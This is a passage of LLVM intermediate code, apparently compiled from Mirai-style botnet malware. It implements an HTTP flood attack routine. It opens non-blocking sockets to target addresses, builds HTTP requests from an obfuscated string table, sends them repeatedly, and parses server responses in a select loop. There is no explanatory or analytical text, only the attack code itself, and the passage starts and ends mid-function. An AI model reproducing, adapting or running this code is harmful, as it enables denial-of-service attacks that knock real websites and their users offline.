  %70 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv698, i32 4
  store i32 %69, i32* %70, align 4
  %71 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv698, i32 6, i64 0
  %72 = tail call i32 @util_strcpy(i8* %71, i8* %17)
  %73 = load i8, i8* %71, align 4
  %74 = icmp eq i8 %73, 47
  br i1 %74, label %79, label %75

; <label>:75:                                     ; preds = %62
  %76 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv698, i32 6, i64 1
  %77 = tail call i32 @util_strlen(i8* %71)
  %78 = sext i32 %77 to i64
  tail call void @llvm.memmove.p0i8.p0i8.i64(i8* %76, i8* %71, i64 %78, i32 1, i1 false)
  store i8 47, i8* %71, align 4
  br label %79

; <label>:79:                                     ; preds = %62, %75
  %80 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv698, i32 10, i64 0
  %81 = tail call i32 @util_strcpy(i8* %80, i8* %15)
  %82 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv698, i32 9, i64 0
  %83 = tail call i32 @util_strcpy(i8* %82, i8* %15)
  %84 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv698, i32 7, i64 0
  %85 = tail call i32 @util_strcpy(i8* %84, i8* %16)
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %67, i32 2
  %87 = load i8, i8* %86, align 4
  %88 = icmp ult i8 %87, 32
  br i1 %88, label %89, label %93

; <label>:89:                                     ; preds = %79
  %90 = load i32, i32* %68, align 4
  %91 = tail call i32 @ntohl(i32 %90) #11
  %92 = tail call i32 @htonl(i32 %91) #11
  store i32 %92, i32* %70, align 4
  br label %93

; <label>:93:                                     ; preds = %89, %79
  tail call void @table_unlock_val(i8 zeroext 72)
  %94 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv698, i32 5, i64 0
  %95 = tail call i8* @table_retrieve_val(i32 72, i32* null)
  %96 = tail call i32 @util_strcpy(i8* %94, i8* %95)
  tail call void @table_lock_val(i8 zeroext 72)
  %97 = tail call i32 @util_strcpy(i8* %71, i8* %17)
  %indvars.iv.next699 = add nuw nsw i64 %indvars.iv698, 1
  %98 = icmp slt i64 %indvars.iv.next699, %46
  br i1 %98, label %62, label %.preheader621.loopexit

.backedge622.loopexit:                            ; preds = %.loopexit617
  br label %.backedge622.backedge

.backedge622:                                     ; preds = %.backedge622.backedge, %.preheader621
  %99 = call i64 @time(i64* null) #10
  %100 = trunc i64 %99 to i32
  %101 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %51) #10, !srcloc !1
  %102 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %52) #10, !srcloc !2
  br i1 %49, label %.lr.ph644.preheader, label %.backedge622.backedge

.lr.ph644.preheader:                              ; preds = %.backedge622
  br label %.lr.ph644

.lr.ph644:                                        ; preds = %.lr.ph644.preheader, %370
  %indvars.iv = phi i64 [ %indvars.iv.next, %370 ], [ 0, %.lr.ph644.preheader ]
  %.0550641 = phi i32 [ %.1551, %370 ], [ 0, %.lr.ph644.preheader ]
  %103 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv
  %104 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 1
  %105 = load i8, i8* %104, align 4
  %106 = icmp eq i8 %105, 1
  br i1 %106, label %107, label %111

; <label>:107:                                    ; preds = %.lr.ph644
  %108 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 12
  %109 = load i32, i32* %108, align 4
  %110 = icmp ne i32 %109, 0
  %.sink = select i1 %110, i8 4, i8 0
  store i8 %.sink, i8* %104, align 4
  br label %111

; <label>:111:                                    ; preds = %107, %.lr.ph644
  %112 = phi i8 [ %.sink, %107 ], [ %105, %.lr.ph644 ]
  switch i8 %112, label %366 [
    i8 0, label %113
    i8 2, label %145
    i8 4, label %167
    i8 6, label %327
    i8 7, label %340
    i8 10, label %353
  ]

; <label>:113:                                    ; preds = %111
  call void @llvm.memset.p0i8.i64(i8* nonnull %53, i8 0, i64 16, i32 4, i1 false)
  %114 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %103, i64 0, i32 0
  %115 = load i32, i32* %114, align 4
  %116 = icmp eq i32 %115, -1
  br i1 %116, label %119, label %117

; <label>:117:                                    ; preds = %113
  %118 = call i32 @close(i32 %115) #10
  br label %119

; <label>:119:                                    ; preds = %113, %117
  %120 = call i32 @socket(i32 2, i32 1, i32 0) #10
  store i32 %120, i32* %114, align 4
  %121 = icmp eq i32 %120, -1
  br i1 %121, label %370, label %122

; <label>:122:                                    ; preds = %119
  %123 = call i32 (i32, i32, ...) @fcntl(i32 %120, i32 3, i32 0) #10
  %124 = or i32 %123, 2048
  %125 = call i32 (i32, i32, ...) @fcntl(i32 %120, i32 4, i32 %124) #10
  store i32 65535, i32* %5, align 4
  %126 = load i32, i32* %114, align 4
  %127 = call i32 @setsockopt(i32 %126, i32 0, i32 8, i8* nonnull %54, i32 4) #10
  store i16 2, i16* %55, align 4
  %128 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 4
  %129 = load i32, i32* %128, align 4
  store i32 %129, i32* %56, align 4
  %130 = call zeroext i16 @htons(i16 zeroext %20) #11
  store i16 %130, i16* %57, align 2
  %131 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 2
  store i32 %100, i32* %131, align 4
  store i8 2, i8* %104, align 4
  %132 = load i32, i32* %114, align 4
  %133 = call i32 @connect(i32 %132, %struct.sockaddr* nonnull %58, i32 16) #10
  %134 = load i32, i32* %114, align 4
  %135 = srem i32 %134, 64
  %136 = zext i32 %135 to i64
  %137 = shl i64 1, %136
  %138 = sdiv i32 %134, 64
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %139
  %141 = load i64, i64* %140, align 8
  %142 = or i64 %137, %141
  store i64 %142, i64* %140, align 8
  %143 = icmp sgt i32 %134, %.0550641
  %144 = add nsw i32 %134, 1
  %..0550 = select i1 %143, i32 %144, i32 %.0550641
  br label %370

; <label>:145:                                    ; preds = %111
  %146 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 2
  %147 = load i32, i32* %146, align 4
  %148 = sub i32 %100, %147
  %149 = icmp ugt i32 %148, 30
  br i1 %149, label %150, label %154

; <label>:150:                                    ; preds = %145
  store i8 0, i8* %104, align 4
  %151 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %103, i64 0, i32 0
  %152 = load i32, i32* %151, align 4
  %153 = call i32 @close(i32 %152) #10
  store i32 -1, i32* %151, align 4
  br label %370

; <label>:154:                                    ; preds = %145
  %155 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %103, i64 0, i32 0
  %156 = load i32, i32* %155, align 4
  %157 = srem i32 %156, 64
  %158 = zext i32 %157 to i64
  %159 = shl i64 1, %158
  %160 = sdiv i32 %156, 64
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %161
  %163 = load i64, i64* %162, align 8
  %164 = or i64 %159, %163
  store i64 %164, i64* %162, align 8
  %165 = icmp sgt i32 %156, %.0550641
  %166 = add nsw i32 %156, 1
  %..0550570 = select i1 %165, i32 %166, i32 %.0550641
  br label %370

; <label>:167:                                    ; preds = %111
  %168 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 14
  store i32 -1, i32* %168, align 4
  %169 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 11
  store i32 0, i32* %169, align 4
  %170 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 18, i64 0
  call void @util_zero(i8* %170, i32 1024)
  %171 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 17
  store i32 0, i32* %171, align 4
  call void @util_zero(i8* nonnull %59, i32 10240)
  %172 = call i32 @util_strlen(i8* nonnull %59)
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %173
  %175 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 9, i64 0
  %176 = call i32 @util_strcpy(i8* %174, i8* %175)
  %177 = call i32 @util_strlen(i8* nonnull %59)
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %178
  %180 = call i32 @util_strcpy(i8* %179, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %181 = call i32 @util_strlen(i8* nonnull %59)
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %182
  %184 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 6, i64 0
  %185 = call i32 @util_strcpy(i8* %183, i8* %184)
  %186 = call i32 @util_strlen(i8* nonnull %59)
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %187
  %189 = call i32 @util_strcpy(i8* %188, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0))
  %190 = call i32 @util_strlen(i8* nonnull %59)
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %191
  %193 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 5, i64 0
  %194 = call i32 @util_strcpy(i8* %192, i8* %193)
  %195 = call i32 @util_strlen(i8* nonnull %59)
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %196
  %198 = call i32 @util_strcpy(i8* %197, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  %199 = call i32 @util_strlen(i8* nonnull %59)
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %200
  %202 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 7, i64 0
  %203 = call i32 @util_strcpy(i8* %201, i8* %202)
  %204 = call i32 @util_strlen(i8* nonnull %59)
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %205
  %207 = call i32 @util_strcpy(i8* %206, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 zeroext 57)
  %208 = call i32 @util_strlen(i8* nonnull %59)
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %209
  %211 = call i8* @table_retrieve_val(i32 57, i32* null)
  %212 = call i32 @util_strcpy(i8* %210, i8* %211)
  call void @table_lock_val(i8 zeroext 57)
  %213 = call i32 @util_strlen(i8* nonnull %59)
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %214
  %216 = call i32 @util_strcpy(i8* %215, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 zeroext 58)
  %217 = call i32 @util_strlen(i8* nonnull %59)
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %218
  %220 = call i8* @table_retrieve_val(i32 58, i32* null)
  %221 = call i32 @util_strcpy(i8* %219, i8* %220)
  call void @table_lock_val(i8 zeroext 58)
  %222 = call i32 @util_strlen(i8* nonnull %59)
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %223
  %225 = call i32 @util_strcpy(i8* %224, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 zeroext 59)
  %226 = call i32 @util_strlen(i8* nonnull %59)
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %227
  %229 = call i8* @table_retrieve_val(i32 59, i32* null)
  %230 = call i32 @util_strcpy(i8* %228, i8* %229)
  call void @table_lock_val(i8 zeroext 59)
  %231 = call i32 @util_strlen(i8* nonnull %59)
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %232
  %234 = call i32 @util_strcpy(i8* %233, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  br i1 %60, label %235, label %263

; <label>:235:                                    ; preds = %167
  call void @table_unlock_val(i8 zeroext 60)
  %236 = call i32 @util_strlen(i8* nonnull %59)
  %237 = sext i32 %236 to i64
  %238 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %237
  %239 = call i8* @table_retrieve_val(i32 60, i32* null)
  %240 = call i32 @util_strcpy(i8* %238, i8* %239)
  call void @table_lock_val(i8 zeroext 60)
  %241 = call i32 @util_strlen(i8* nonnull %59)
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %242
  %244 = call i32 @util_strcpy(i8* %243, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  %245 = call i32 @util_strlen(i8* nonnull %59)
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %246
  %248 = call i8* @table_retrieve_val(i32 65, i32* null)
  %249 = call i32 @util_strcpy(i8* %247, i8* %248)
  %250 = call i32 @util_strlen(i8* nonnull %59)
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %251
  %253 = call i32 @util_strcpy(i8* %252, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %254 = call i32 @util_strlen(i8* nonnull %14)
  %255 = call i32 @util_strlen(i8* nonnull %59)
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %256
  %258 = call i8* @util_itoa(i32 %254, i32 10, i8* %257)
  %259 = call i32 @util_strlen(i8* nonnull %59)
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %260
  %262 = call i32 @util_strcpy(i8* %261, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  br label %263

; <label>:263:                                    ; preds = %235, %167
  %264 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 15
  %265 = load i32, i32* %264, align 4
  %266 = icmp sgt i32 %265, 0
  br i1 %266, label %267, label %293

; <label>:267:                                    ; preds = %263
  %268 = call i32 @util_strlen(i8* nonnull %59)
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %269
  %271 = call i32 @util_strcpy(i8* %270, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %5, align 4
  %272 = load i32, i32* %264, align 4
  %273 = icmp sgt i32 %272, 0
  %274 = call i32 @util_strlen(i8* nonnull %59)
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %275
  br i1 %273, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %267
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %277 = phi i8* [ %291, %.lr.ph ], [ %276, %.lr.ph.preheader ]
  %storemerge568640 = phi i32 [ %286, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %278 = sext i32 %storemerge568640 to i64
  %279 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 16, i64 %278, i64 0
  %280 = call i32 @util_strcpy(i8* %277, i8* %279)
  %281 = call i32 @util_strlen(i8* nonnull %59)
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %282
  %284 = call i32 @util_strcpy(i8* %283, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0))
  %285 = load i32, i32* %5, align 4
  %286 = add nsw i32 %285, 1
  store i32 %286, i32* %5, align 4
  %287 = load i32, i32* %264, align 4
  %288 = icmp slt i32 %286, %287
  %289 = call i32 @util_strlen(i8* nonnull %59)
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %290
  br i1 %288, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %267
  %.lcssa = phi i8* [ %276, %267 ], [ %291, %._crit_edge.loopexit ]
  %292 = call i32 @util_strcpy(i8* %.lcssa, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  br label %293

; <label>:293:                                    ; preds = %._crit_edge, %263
  %294 = call i32 @util_strlen(i8* nonnull %59)
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %295
  %297 = call i32 @util_strcpy(i8* %296, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  br i1 %60, label %298, label %303

; <label>:298:                                    ; preds = %293
  %299 = call i32 @util_strlen(i8* nonnull %59)
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %300
  %302 = call i32 @util_strcpy(i8* %301, i8* nonnull %14)
  br label %303

; <label>:303:                                    ; preds = %298, %293
  %304 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 10, i64 0
  %305 = call signext i8 @util_strcmp(i8* nonnull %175, i8* %304)
  %306 = icmp eq i8 %305, 0
  br i1 %306, label %307, label %309

; <label>:307:                                    ; preds = %303
  %308 = call i32 @util_strcpy(i8* nonnull %175, i8* %304)
  br label %309

; <label>:309:                                    ; preds = %303, %307
  %310 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %103, i64 0, i32 0
  %311 = load i32, i32* %310, align 4
  %312 = call i32 @util_strlen(i8* nonnull %59)
  %313 = sext i32 %312 to i64
  %314 = call i64 @send(i32 %311, i8* nonnull %59, i64 %313, i32 16384) #10
  %315 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 3
  store i32 %100, i32* %315, align 4
  store i8 6, i8* %104, align 4
  %316 = load i32, i32* %310, align 4
  %317 = srem i32 %316, 64
  %318 = zext i32 %317 to i64
  %319 = shl i64 1, %318
  %320 = sdiv i32 %316, 64
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %321
  %323 = load i64, i64* %322, align 8
  %324 = or i64 %319, %323
  store i64 %324, i64* %322, align 8
  %325 = icmp sgt i32 %316, %.0550641
  %326 = add nsw i32 %316, 1
  %..0550571 = select i1 %325, i32 %326, i32 %.0550641
  br label %370

; <label>:327:                                    ; preds = %111
  %328 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %103, i64 0, i32 0
  %329 = load i32, i32* %328, align 4
  %330 = srem i32 %329, 64
  %331 = zext i32 %330 to i64
  %332 = shl i64 1, %331
  %333 = sdiv i32 %329, 64
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %334
  %336 = load i64, i64* %335, align 8
  %337 = or i64 %332, %336
  store i64 %337, i64* %335, align 8
  %338 = icmp sgt i32 %329, %.0550641
  %339 = add nsw i32 %329, 1
  %..0550572 = select i1 %338, i32 %339, i32 %.0550641
  br label %370

; <label>:340:                                    ; preds = %111
  %341 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %103, i64 0, i32 0
  %342 = load i32, i32* %341, align 4
  %343 = srem i32 %342, 64
  %344 = zext i32 %343 to i64
  %345 = shl i64 1, %344
  %346 = sdiv i32 %342, 64
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %347
  %349 = load i64, i64* %348, align 8
  %350 = or i64 %345, %349
  store i64 %350, i64* %348, align 8
  %351 = icmp sgt i32 %342, %.0550641
  %352 = add nsw i32 %342, 1
  %..0550573 = select i1 %351, i32 %352, i32 %.0550641
  br label %370

; <label>:353:                                    ; preds = %111
  %354 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %103, i64 0, i32 0
  %355 = load i32, i32* %354, align 4
  %356 = srem i32 %355, 64
  %357 = zext i32 %356 to i64
  %358 = shl i64 1, %357
  %359 = sdiv i32 %355, 64
  %360 = sext i32 %359 to i64
  %361 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %360
  %362 = load i64, i64* %361, align 8
  %363 = or i64 %358, %362
  store i64 %363, i64* %361, align 8
  %364 = icmp sgt i32 %355, %.0550641
  %365 = add nsw i32 %355, 1
  %..0550574 = select i1 %364, i32 %365, i32 %.0550641
  br label %370

; <label>:366:                                    ; preds = %111
  store i8 0, i8* %104, align 4
  %367 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %103, i64 0, i32 0
  %368 = load i32, i32* %367, align 4
  %369 = call i32 @close(i32 %368) #10
  store i32 -1, i32* %367, align 4
  br label %370

; <label>:370:                                    ; preds = %353, %340, %327, %309, %154, %122, %366, %119, %150
  %.1551 = phi i32 [ %.0550641, %119 ], [ %.0550641, %150 ], [ %.0550641, %366 ], [ %..0550, %122 ], [ %..0550570, %154 ], [ %..0550571, %309 ], [ %..0550572, %327 ], [ %..0550573, %340 ], [ %..0550574, %353 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %371 = icmp slt i64 %indvars.iv.next, %46
  br i1 %371, label %.lr.ph644, label %._crit_edge645

._crit_edge645:                                   ; preds = %370
  %372 = icmp eq i32 %.1551, 0
  br i1 %372, label %.backedge622.backedge, label %373

.backedge622.backedge:                            ; preds = %._crit_edge645, %373, %.backedge622, %.backedge622.loopexit
  br label %.backedge622

; <label>:373:                                    ; preds = %._crit_edge645
  store <2 x i64> <i64 1, i64 0>, <2 x i64>* %9, align 16
  %374 = call i32 @select(i32 %.1551, %struct.fd_set* nonnull %7, %struct.fd_set* nonnull %8, %struct.fd_set* null, %struct.timeval* nonnull %tmpcast) #10
  %375 = call i64 @time(i64* null) #10
  %376 = trunc i64 %375 to i32
  %377 = icmp slt i32 %374, 1
  %brmerge = or i1 %377, %.not
  br i1 %brmerge, label %.backedge622.backedge, label %.lr.ph664.preheader

.lr.ph664.preheader:                              ; preds = %373
  br label %.lr.ph664

.lr.ph664:                                        ; preds = %.lr.ph664.preheader, %.loopexit617
  %indvars.iv696 = phi i64 [ %indvars.iv.next697, %.loopexit617 ], [ 0, %.lr.ph664.preheader ]
  %378 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 0
  %379 = load i32, i32* %378, align 4
  %380 = icmp eq i32 %379, -1
  br i1 %380, label %.loopexit617, label %381

; <label>:381:                                    ; preds = %.lr.ph664
  %382 = sdiv i32 %379, 64
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %383
  %385 = load i64, i64* %384, align 8
  %386 = srem i32 %379, 64
  %387 = zext i32 %386 to i64
  %388 = shl i64 1, %387
  %389 = and i64 %385, %388
  %390 = icmp eq i64 %389, 0
  br i1 %390, label %402, label %391

; <label>:391:                                    ; preds = %381
  store i32 0, i32* %12, align 4
  store i32 4, i32* %13, align 4
  %392 = call i32 @getsockopt(i32 %379, i32 1, i32 4, i8* nonnull %61, i32* nonnull %13) #10
  %393 = load i32, i32* %12, align 4
  %394 = or i32 %393, %392
  %395 = icmp eq i32 %394, 0
  br i1 %395, label %396, label %398

; <label>:396:                                    ; preds = %391
  %397 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 1
  store i8 4, i8* %397, align 4
  %.pre700 = load i32, i32* %378, align 4
  br label %402

; <label>:398:                                    ; preds = %391
  %399 = load i32, i32* %378, align 4
  %400 = call i32 @close(i32 %399) #10
  store i32 -1, i32* %378, align 4
  %401 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 1
  store i8 0, i8* %401, align 4
  br label %.loopexit617

; <label>:402:                                    ; preds = %381, %396
  %403 = phi i32 [ %379, %381 ], [ %.pre700, %396 ]
  %404 = sdiv i32 %403, 64
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %405
  %407 = load i64, i64* %406, align 8
  %408 = srem i32 %403, 64
  %409 = zext i32 %408 to i64
  %410 = shl i64 1, %409
  %411 = and i64 %410, %407
  %412 = icmp eq i64 %411, 0
  br i1 %412, label %.loopexit617, label %413

; <label>:413:                                    ; preds = %402
  %414 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 1
  %415 = load i8, i8* %414, align 4
  switch i8 %415, label %.loopexit617 [
    i8 6, label %424
    i8 7, label %.preheader616
    i8 10, label %.preheader618.preheader
  ]

.preheader618.preheader:                          ; preds = %413
  br label %.preheader618

.preheader616:                                    ; preds = %413
  %416 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 17
  %417 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 18, i64 0
  %418 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 18, i64 64
  %419 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 2
  %420 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 14
  %421 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 11
  %422 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 13
  %423 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 15
  br label %834

; <label>:424:                                    ; preds = %413
  call void @util_zero(i8* nonnull %21, i32 10240)
  %425 = load i32, i32* %378, align 4
  %426 = call i64 @recv(i32 %425, i8* nonnull %21, i64 10240, i32 16386) #10
  %427 = trunc i64 %426 to i32
  %428 = icmp slt i32 %427, 1
  br i1 %428, label %429, label %432

; <label>:429:                                    ; preds = %424
  %430 = load i32, i32* %378, align 4
  %431 = call i32 @close(i32 %430) #10
  store i32 -1, i32* %378, align 4
  store i8 0, i8* %414, align 4
  br label %.loopexit617

; <label>:432:                                    ; preds = %424
  %433 = call i32 @util_memsearch(i8* nonnull %21, i32 %427, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4)
  %434 = icmp eq i32 %433, -1
  %435 = icmp slt i32 %427, 10240
  %or.cond5 = and i1 %435, %434
  br i1 %or.cond5, label %.loopexit617, label %436

; <label>:436:                                    ; preds = %432
  %437 = sext i32 %433 to i64
  %438 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %437
  store i8 0, i8* %438, align 1
  %439 = call i8* @table_retrieve_val(i32 71, i32* null)
  %440 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %439)
  %441 = icmp eq i32 %440, -1
  br i1 %441, label %444, label %442

; <label>:442:                                    ; preds = %436
  %443 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 11
  store i32 2, i32* %443, align 4
  br label %444

; <label>:444:                                    ; preds = %436, %442
  %445 = call i8* @table_retrieve_val(i32 70, i32* null)
  %446 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %445)
  %447 = icmp eq i32 %446, -1
  br i1 %447, label %450, label %448

; <label>:448:                                    ; preds = %444
  %449 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 11
  store i32 1, i32* %449, align 4
  br label %450

; <label>:450:                                    ; preds = %444, %448
  %451 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 12
  store i32 0, i32* %451, align 4
  %452 = call i8* @table_retrieve_val(i32 69, i32* null)
  %453 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %452)
